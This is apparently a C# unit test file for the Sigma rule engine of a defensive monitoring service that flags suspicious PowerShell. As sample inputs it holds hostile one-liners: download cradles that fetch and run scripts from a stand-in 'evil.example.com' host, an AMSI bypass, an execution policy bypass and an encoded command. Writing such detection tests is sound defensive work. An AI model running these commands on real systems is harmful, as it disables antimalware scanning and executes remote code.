using Downpour.Service;
using Xunit;

namespace Downpour.Tests;

public sealed class SigmaEngineTests
{
    [Fact]
    public void GetBuiltinRules_ReturnsExpectedRules()
    {
        var rules = SigmaEngine.GetBuiltinRules();

        Assert.NotEmpty(rules);
        Assert.Contains(rules, r => r.Id == "sigma-powershell-encoded-command");
        Assert.Contains(rules, r => r.Id == "sigma-powershell-bypass");
        Assert.Contains(rules, r => r.Id == "sigma-powershell-download-cradle");
        Assert.Contains(rules, r => r.Id == "sigma-powershell-obfuscation");
        Assert.Contains(rules, r => r.Id == "sigma-powershell-amsi-bypass");
        Assert.Contains(rules, r => r.Id == "sigma-powershell-wmi");
    }

    [Fact]
    public void LoadFromYaml_ParsesValidYaml()
    {
        const string yaml = """
            ---
            id: "test-rule"
            title: "Test Rule"
            level: "high"
            description: "Test description"
            tags: ["tag1", "tag2"]
            detection:
              detection1:
                contains: "test"
              condition: detection1
            """;

        var rules = SigmaEngine.LoadFromYaml(yaml);

        Assert.Single(rules);
        Assert.Equal("test-rule", rules[0].Id);
        Assert.Equal("Test Rule", rules[0].Title);
        Assert.Equal("high", rules[0].Level);
        Assert.Equal("Test description", rules[0].Description);
        Assert.Equal(["tag1", "tag2"], rules[0].Tags);
        Assert.Single(rules[0].Detection);
    }

    [Fact]
    public void LoadFromYaml_RejectsMalformedYaml()
    {
        const string yaml = "invalid: yaml: [unclosed";

        var rules = SigmaEngine.LoadFromYaml(yaml);

        Assert.Empty(rules);
    }

    [Fact]
    public void Match_DetectsEncodedCommand()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "powershell -EncodedCommand SQBFAFgAIAAoACcAdABlAHMAdAAnACkA";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-encoded-command");
    }

    [Fact]
    public void Match_DetectsExecutionPolicyBypass()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "powershell -ExecutionPolicy Bypass -Command \"Write-Host test\"";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-bypass");
    }

    [Fact]
    public void Match_DetectsDownloadCradle()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-download-cradle");
    }

    [Fact]
    public void Match_DetectsObfuscation()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "Invoke-Expression ([string]::Join('',[char[]](97,98,99))).Replace('a','b')";

        var matches = SigmaEngine.Match(text, rules);
        
        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-obfuscation");
    }

    [Fact]
    public void Match_DetectsAmsiBypass()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-amsi-bypass");
    }

    [Fact]
    public void Match_DetectsWmi()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "Get-WmiObject -Class Win32_Process -Namespace root\\cimv2";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Contains(matches, m => m.RuleId == "sigma-powershell-wmi");
    }

    [Fact]
    public void Match_ReturnsEmptyForCleanText()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "Write-Host 'Hello World'";

        var matches = SigmaEngine.Match(text, rules);

        Assert.Empty(matches);
    }

    [Fact]
    public void Match_ReturnsEmptyForNullOrEmptyInput()
    {
        var rules = SigmaEngine.GetBuiltinRules();

        Assert.Empty(SigmaEngine.Match("", rules));
        Assert.Empty(SigmaEngine.Match(null, rules));
        Assert.Empty(SigmaEngine.Match("test", null));
    }

    [Fact]
    public void Match_ReturnsMatchDetails()
    {
        var rules = SigmaEngine.GetBuiltinRules();
        var text = "powershell -encodedcommand test";

        var matches = SigmaEngine.Match(text, rules);

        var match = Assert.Single(matches);
        Assert.Equal("sigma-powershell-encoded-command", match.RuleId);
        Assert.Equal("PowerShell Encoded Command", match.RuleTitle);
        Assert.Equal("high", match.Level);
        Assert.Equal("-encodedcommand", match.MatchedText);
        Assert.True(match.MatchIndex >= 0);
    }

    [Fact]
    public void LoadFromYamlFiles_LoadsMultipleFiles()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), "sigma-test-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(tempDir);
        try
        {
            File.WriteAllText(Path.Combine(tempDir, "rule1.yaml"), """
                ---
                id: "file-rule-1"
                title: "File Rule 1"
                level: "medium"
                detection:
                  test:
                    contains: "test"
                  condition: test
                """);
            File.WriteAllText(Path.Combine(tempDir, "rule2.yaml"), """
                ---
                id: "file-rule-2"
                title: "File Rule 2"
                level: "low"
                detection:
                  test:
                    contains: "example"
                  condition: test
                """);

            var rules = SigmaEngine.LoadFromYamlFiles(new[] { Path.Combine(tempDir, "rule1.yaml"), Path.Combine(tempDir, "rule2.yaml") });

            Assert.Equal(2, rules.Count);
            Assert.Contains(rules, r => r.Id == "file-rule-1");
            Assert.Contains(rules, r => r.Id == "file-rule-2");
        }
        finally
        {
            Directory.Delete(tempDir, true);
        }
    }

    [Fact]
    public void LoadBundledRules_LoadsAllBundledRules()
    {
        var rules = SigmaEngine.LoadBundledRules(out var report);

        Assert.True(rules.Count >= 101, $"Expected at least 101 rules, got {rules.Count}");
        Assert.Equal(rules.Count, report.TotalRulesFound);
        Assert.Equal(rules.Count, report.ValidRulesLoaded);
        Assert.Equal(0, report.UnsupportedRulesCount);
        Assert.Empty(report.UnsupportedModifiers);
        Assert.Empty(report.UnsupportedConditions);
        Assert.Empty(report.Issues);

        Assert.All(rules, r =>
        {
            Assert.False(string.IsNullOrWhiteSpace(r.Id));
            Assert.False(string.IsNullOrWhiteSpace(r.Title));
            Assert.False(string.IsNullOrWhiteSpace(r.Level));
            Assert.True(r.IsSupported);
        });
    }

    [Fact]
    public void LoadFromYaml_SurfacesUnsupportedModifier()
    {
        const string yaml = """
            ---
            id: "test-unsupported-modifier"
            title: "Test Unsupported Modifier"
            level: "medium"
            detection:
              selection:
                CommandLine|cidr: "10.0.0.0/8"
              condition: selection
            """;

        var rules = SigmaEngine.LoadFromYaml(yaml, out var report);

        Assert.Single(rules);
        Assert.False(rules[0].IsSupported);
        Assert.Contains("cidr", rules[0].UnsupportedReason);
        Assert.Equal(1, report.UnsupportedRulesCount);
        Assert.True(report.UnsupportedModifiers.ContainsKey("cidr"));
        Assert.Contains(report.Issues, i => i.Contains("cidr"));
    }

    [Fact]
    public void LoadFromYaml_SurfacesUnsupportedCondition()
    {
        const string yaml = """
            ---
            id: "test-unsupported-condition"
            title: "Test Unsupported Condition"
            level: "high"
            detection:
              selection:
                CommandLine|contains: "cmd.exe"
              condition: selection | count() > 5
            """;

        var rules = SigmaEngine.LoadFromYaml(yaml, out var report);

        Assert.Single(rules);
        Assert.False(rules[0].IsSupported);
        Assert.Contains("count(", rules[0].UnsupportedReason);
        Assert.Equal(1, report.UnsupportedRulesCount);
        Assert.Contains(report.Issues, i => i.Contains("unsupported condition", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void MatchScriptBlock_MatchesBundledPowerShellDownloadCradle()
    {
        var rules = SigmaEngine.LoadBundledRules();
        var script = "(New-Object Net.WebClient).DownloadString('http://evil.example.com/payload.ps1')";

        var matches = SigmaEngine.MatchScriptBlock(script, rules);

        Assert.Contains(matches, m => m.RuleId == "downpour-sigma-061" || m.RuleTitle == "PowerShell Download Cradle");
    }

    [Fact]
    public void MatchProcess_EvaluatesProcessCreationRulesWithMultipleConditions()
    {
        var rules = SigmaEngine.LoadBundledRules();

        // Matching: powershell image + encoded flag
        var matches = SigmaEngine.MatchProcess(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            @"powershell.exe -enc SQBFAFgAIAAo...",
            @"C:\Windows\explorer.exe",
            "SYSTEM",
            rules);

        Assert.Contains(matches, m => m.RuleId == "downpour-sigma-060");

        // Non-matching image (notepad) with encoded flag should NOT match
        var notepadMatches = SigmaEngine.MatchProcess(
            @"C:\Windows\notepad.exe",
            @"notepad.exe -enc SQBFAFgAIAAo...",
            @"C:\Windows\explorer.exe",
            "SYSTEM",
            rules);

        Assert.DoesNotContain(notepadMatches, m => m.RuleId == "downpour-sigma-060");

        // PowerShell image without encoded flag should NOT match
        var normalPsMatches = SigmaEngine.MatchProcess(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            @"powershell.exe Get-Process",
            @"C:\Windows\explorer.exe",
            "SYSTEM",
            rules);

        Assert.DoesNotContain(normalPsMatches, m => m.RuleId == "downpour-sigma-060");
    }

    [Fact]
    public void ConditionEvaluator_Supports1OfPattern()
    {
        const string yaml = """
            ---
            id: "test-1-of-pattern"
            title: "Test 1 of pattern"
            level: "high"
            detection:
              sel_a:
                CommandLine|contains: "flag_a"
              sel_b:
                CommandLine|contains: "flag_b"
              condition: 1 of sel*
            """;

        var rules = SigmaEngine.LoadFromYaml(yaml);
        var matchesA = SigmaEngine.Match("something flag_a here", rules);
        var matchesB = SigmaEngine.Match("something flag_b here", rules);
        var matchesNone = SigmaEngine.Match("clean command", rules);

        Assert.Single(matchesA);
        Assert.Single(matchesB);
        Assert.Empty(matchesNone);
    }

    [Fact]
    public void ConditionEvaluator_SupportsNotOperator()
    {
        const string yaml = """
            ---
            id: "test-not-operator"
            title: "Test not operator"
            level: "high"
            detection:
              selection:
                CommandLine|contains: "attack"
              filter:
                CommandLine|contains: "benign"
              condition: selection and not filter
            """;

        var rules = SigmaEngine.LoadFromYaml(yaml);

        var hit = SigmaEngine.Match("command attack", rules);
        var filtered = SigmaEngine.Match("command attack benign", rules);

        Assert.Single(hit);
        Assert.Empty(filtered);
    }

    [Fact]
    public void SigmaAmsiEventProcessor_ProcessesPowerShell4104WithBundledRules()
    {
        var logger = Microsoft.Extensions.Logging.Abstractions.NullLogger<SigmaAmsiEventProcessor>.Instance;
        var processor = new SigmaAmsiEventProcessor(logger);

        var observation = new Downpour.Contracts.SecurityEventObservation(
            LogName: "Microsoft-Windows-PowerShell/Operational",
            Provider: "Microsoft-Windows-PowerShell",
            EventId: 4104,
            RecordId: 99999,
            CreatedAtUtc: DateTimeOffset.UtcNow,
            Severity: "Information",
            Technique: "T1059.001",
            Summary: "IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')",
            Occurrences: 1);

        var alerts = processor.ProcessEvent(observation);

        Assert.NotEmpty(alerts);
        Assert.Contains(alerts, a => a.Title.Contains("Sigma Match") && a.EventId == 4104);
    }
}